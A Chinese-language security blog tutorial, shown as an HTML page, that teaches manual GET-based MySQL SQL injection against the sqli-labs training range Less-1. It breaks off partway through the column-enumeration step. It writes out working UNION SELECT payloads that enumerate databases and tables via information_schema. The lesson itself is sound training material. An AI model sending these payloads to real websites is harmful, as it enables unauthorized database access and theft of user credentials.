@@ -1,0 +1,1972 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分">
+<title>1.5 SQL注入系列-1</title>
+
+<link rel='canonical' href='https://www.retr0.xyz/p/1.5-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-1/'>
+
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.5 SQL注入系列-1">
+<meta property='og:description' content="GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.5-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-1/'>
+<meta property='og:site_name' content='Retr0的小窝'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-28T20:07:03&#43;08:00'/><meta property='article:modified_time' content='2025-11-28T20:07:03&#43;08:00'/>
+<meta name="twitter:title" content="1.5 SQL注入系列-1">
+<meta name="twitter:description" content="GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+        <link rel="stylesheet" href="/css/APlayer.min.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_918ed7c4aecb3d05.gif" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥳</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Retr0的小窝</a></h1>
+            <h2 class="site-description">我们安全了……暂时的</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/349466985'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:ded000@retr0.xyz'
+                        target="_blank"
+                        title="email"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/makabaka11'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.retr0.xyz/index.xml'
+                        target="_blank"
+                        title="RSS"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-rss"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /><path d="M4 4a16 16 0 0 1 16 16" /><path d="M4 11a9 9 0 0 1 9 9" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://t.me/ded0000'
+                        target="_blank"
+                        title="Telegram"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-telegram"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页 | Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E-about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于 | About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档 | Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/message/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-message"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 9h8" /><path d="M8 13h6" /><path d="M18 4a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-5l-5 3v-3h-2a3 3 0 0 1 -3 -3v-8a3 3 0 0 1 3 -3h12z" /></svg>
+                
+                <span>留言板 | Msg Board</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索 | Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>技术链接 | Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#手动注入order-by与联合查询注入">手动注入(ORDER BY与联合查询注入)</a>
+      <ol>
+        <li><a href="#step1破坏数据库语句">Step1：破坏数据库语句</a></li>
+        <li><a href="#step2确定查询了多少个栏目">Step2：确定查询了多少个栏目</a></li>
+        <li><a href="#step3显示报错位">Step3：显示报错位</a></li>
+        <li><a href="#step4查看数据库的库名">Step4：查看数据库的库名</a></li>
+        <li><a href="#step5根据库名查看表名">Step5：根据库名查看表名</a></li>
+        <li><a href="#step6查询所需表的列栏目名">Step6：查询所需表的列（栏目）名</a></li>
+        <li><a href="#step7全部取出username及对应password">Step7：全部取出username及对应password</a>
+          <ol>
+            <li><a href="#方法一group_concat语法">方法一：group_concat()语法</a></li>
+            <li><a href="#方法二limit-ab-语法">方法二：limit a,b 语法</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#工具辅助注入">工具辅助注入</a>
+      <ol>
+        <li><a href="#sqlmap-用法使用kali版本">sqlmap 用法（使用Kali版本）</a></li>
+        <li><a href="#略微引申post类型的注入">略微引申：POST类型的注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#拓展知识">拓展知识</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/" >
+                渗透测试微专业
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/1.5-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-1/">1.5 SQL注入系列-1</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分
+        </h3>
+        
+    </div>
+
+    
+    
+     
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-11-28</time>
+            </div>
+        
+
+        
+
+        
+        <div id="viewCount">
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--reading">
+                <span id="vercount_value_page_pv">loading... </span>次
+            </time>
+        </div>
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="手动注入order-by与联合查询注入">手动注入(ORDER BY与联合查询注入)
+</h2><p>以靶场<a class="link" href="http://sqlilabs.njhack.xyz/Less-1/index.php"  target="_blank" rel="noopener"
+    >http://sqlilabs.njhack.xyz/Less-1/index.php</a>为例</p>
+<h3 id="step1破坏数据库语句">Step1：破坏数据库语句
+</h3><blockquote>
+<p>破坏数据库语句的目的就是让数据库报错，通过报错信息猜测查询语句的写法</p>
+</blockquote>
+<p>数据库传入参数的几种闭合方式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&#39;&#39;
+</span></span><span class="line"><span class="cl">&#34;&#34;
+</span></span><span class="line"><span class="cl">()
+</span></span><span class="line"><span class="cl">((&#39;&#39;))
+</span></span><span class="line"><span class="cl">(&#34;&#34;)
+</span></span><span class="line"><span class="cl">((&#34;&#34;))
+</span></span><span class="line"><span class="cl">(())
+</span></span><span class="line"><span class="cl">没有闭合方式
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<p><strong>补充1：</strong></p>
+<p><code>\</code>称为转义字符，可以把自己后面的第一个东西当作字符串去执行</p>
+<hr>
+<p>我们传入以下参数：<code>2\</code></p>
+<p>有如下报错：</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c3f5d4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>我们选取其中核心部分<code>''2\' LIMIT 0,1'</code>去掉头尾<font style="color:#DF2A3F;">（因为头尾用来闭合的符号是php报错语句携带的，不是真实代码）</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="err">&#39;</span><span class="mi">2</span><span class="nx">\</span><span class="err">&#39;</span> <span class="nx">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由此得知该数据库的查询语句是单引号<code>''</code>闭合</p>
+<p>因此大概估计查询语句可能为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="nx">username</span><span class="p">,</span><span class="nx">password</span> <span class="nx">from</span> <span class="nx">tablex</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;$id&#39;</span> <span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><font style="color:#DF2A3F;">解释：</font></strong><font style="color:#DF2A3F;">此处</font><code>limit a,b</code><font style="color:#DF2A3F;">语法指从数据表的第a条起选取b条数据</font></p>
+<p><font style="color:#DF2A3F;">数据表条目要从第0个开始数</font></p>
+<hr>
+<p><strong>补充2：</strong></p>
+<ol>
+<li>数据库的注释符：<code>--</code>、<code>/**/</code>、<code>#</code></li>
+<li><code>+</code>在GET请求里相当于空格</li>
+</ol>
+<p><code>+</code>一般配合<code>--</code>作为GET请求的注释符使用</p>
+<hr>
+<p>接下来我们传入参数<code>id=2' --+</code>，那么拼成的语句是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="nx">username</span><span class="p">,</span><span class="nx">password</span> <span class="nx">from</span> <span class="nx">tablex</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span> <span class="o">--+</span> <span class="err">&#39;</span><span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于<code>--</code>把后面的内容都注释掉了，实际上执行的数据库语句应该是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="nx">username</span><span class="p">,</span><span class="nx">password</span> <span class="nx">from</span> <span class="nx">tablex</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提交参数发现查询正常（如图），说明它真的是用<code>''</code>进行闭合的</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c43d19.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><strong>后日谈：</strong> 也可以用永真或永假条件进行测试，即传入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">OR 1=1	//永真
+</span></span><span class="line"><span class="cl">OR 1=2	//永假
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="step2确定查询了多少个栏目">Step2：确定查询了多少个栏目
+</h3><p>从现在开始我们要调用各种语法查询数据，<font style="color:#DF2A3F;">记住之后的语法全部都是插入在</font><code>2' {} --+</code><font style="color:#DF2A3F;">中的花括号位置！</font></p>
+<p>因为之前的语句中username,password栏目是猜测的，所以接下来要核实究竟有多少个栏目</p>
+<p>传入参数<code>2' order by [数字] --+</code>使用二分法查看</p>
+<p>依次传参，其中数字填为10、5、3&hellip;&hellip;</p>
+<p>当数字最大为<strong>3</strong>时有结果，改为<strong>4</strong>时没有结果</p>
+<p>因此确定查询出了<strong>3</strong>个栏目，之前的猜测错误</p>
+<p>修正：可能的查询项目是<code>id,username,password</code></p>
+<h3 id="step3显示报错位">Step3：显示报错位
+</h3><p>传入参数<code>2' union select 1,2,3  --+</code>返回结果</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c8d1b4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>但是我们想要让查询的1,2,3显示出来，所以要故意让<code>union</code>之前的查询语句出错掩盖掉正常数据</p>
+<p>传入参数<code>-2' union select 1,2,3  --+</code>返回结果</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c7a6ae.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>说明2、3号位是报错位（显示位）</p>
+<hr>
+<p><strong>补充3：</strong></p>
+<p><code>union select a,b,c</code>语法为<strong>联合查询</strong>，方便我们将两条查询语句捆绑起来一起执行，<font style="color:#DF2A3F;">而且即便其中一条查询语句报错也不影响另一条查询语句输出结果</font>，本地演示效果如下：</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c781ab.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>第二条select查询的1,2,3正好与前面查询的3个项目一一对应显示，<strong><font style="color:#DF2A3F;">因此第二条select内容务必参照Step2中获得的查询栏目数填写！</font></strong></p>
+<hr>
+<h3 id="step4查看数据库的库名">Step4：查看数据库的库名
+</h3><p>使用语法<code>database()</code>替换任意报错位</p>
+<p>传入参数<code>-2' union select 1,database(),3  --+</code>返回结果:</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f1fca874.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>此时2号位对应显示的就是数据库的库名：security</p>
+<h3 id="step5根据库名查看表名">Step5：根据库名查看表名
+</h3><p><strong>补充4：</strong></p>
+<p>数据库中一般有一个库名为<code>information_schema</code>其中有名为<code>TABLES</code>的数据表，里面统计了各个数据库名及其对应包含的表名，其中数据库名所在的列（栏目）为<code>TABLE_SCHNEMA</code>，数据表名所在的列（栏目）为<code>TABLE_NAME</code>，如图</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f2017a19.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<hr>
+<p>所以我们要编辑一下第二条查询语句让他能查询到<code>information_schema</code>库中<code>TABLES</code>表中的<code>TABLE_NAME</code>栏目，并且要限制条件TABLE_SCHEMA=&lsquo;security&rsquo;，整合一下需求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="s1">&#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=&#39;</span><span class="nx">security</span><span class="err">&#39;</span>  <span class="o">--+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为了方便一个个查询符合的数据（一个个查看security库中的表名）我们可以在第二条语句后面补充<code>limit 0,1</code>，之后依次修改前一个数字为1、2、3、4&hellip;&hellip;即可，也就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="s1">&#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=&#39;</span><span class="nx">security</span><span class="err">&#39;</span> <span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span> <span class="o">--+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传入参数后发现有4张表：<code>emails  referers  uagents  users</code></p>
+<p>显然<code>users</code>这个表对我们应该更有用</p>
+<h3 id="step6查询所需表的列栏目名">Step6：查询所需表的列（栏目）名
+</h3><p><strong>补充5：</strong></p>
+<p><code>information_schema</code>这个库中还有一个名为<code>COLUMNS</code>的表，里面记录了某个数据库（TABLE_SCHEMA）当中每个表（<code>TABLE_NAME</code>）里包含的栏目(<code>COLUMN_NAME</code>)</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f1fe187f.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><strong>后日谈：</strong></p>
+<div class="info-schema-article-fragment" style="position:relative;padding:80px 20px;display:flex;justify-content:center;align-items:center;font-family:'Microsoft YaHei',sans-serif;width:100%;box-sizing:border-box;"><style>.info-schema-article-fragment .outer-container{display:flex;align-items:center;gap:50px;background-color:#f3e5f5;border:4px solid #6a11cb;border-radius:20px;padding:40px 50px;box-shadow:0 8px 16px rgba(106,17,203,0.2);}.info-schema-article-fragment .table-container{display:flex;flex-direction:column;align-items:center;gap:15px;background-color:#e0f7fa;border:3px solid #11cbbb;border-radius:15px;padding:25px 30px;min-width:220px;}.info-schema-article-fragment .table-container.columns{background-color:#e3f2fd;border-color:#118ab2;}.info-schema-article-fragment .table-title{color:#2d3436;font-size:16px;font-weight:bold;text-align:center;}.info-schema-article-fragment .fields-container{display:flex;flex-direction:column;gap:10px;width:100%;}.info-schema-article-fragment .field-node{background-color:#ffd166;color:#2d3436;padding:12px 15px;border-radius:10px;font-size:14px;text-align:center;box-shadow:0 2px 4px rgba(0,0,0,0.1);}.info-schema-article-fragment .field-node.special{background-color:#f8a4d8;}.info-schema-article-fragment .top-label{position:absolute;top:40px;left:50%;transform:translateX(-50%);color:#6a11cb;font-size:18px;font-weight:bold;}</style><div class="top-label">information_schema（MySQL元数据系统库）</div><div class="outer-container"><div class="table-container tables"><div class="table-title">tables 表<br/>(表元数据)</div><div class="fields-container"><div class="field-node">TABLE_SCHEMA<br/>表所属数据库名</div><div class="field-node">TABLE_NAME<br/>表名称</div></div></div><div class="table-container columns"><div class="table-title">columns 表<br/>(列元数据)</div><div class="fields-container"><div class="field-node">TABLE_SCHEMA<br/>字段所属数据库名</div><div class="field-node">TABLE_NAME<br/>字段所属表名</div><div class="field-node special">COLUMN_NAME<br/>字段名</div></div></div></div></div>
+<hr>
+<p>所以我们现在的需求就是去<code>information_schema.COLUMNS</code>表中查找<code>COLUMN_NAME</code>栏目来看看security里users这个表有哪些栏目，并且添加限定条件<code>TABLE_SCHEMA='security' and TABLE_NAME='users'</code>整合需求得到以下参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
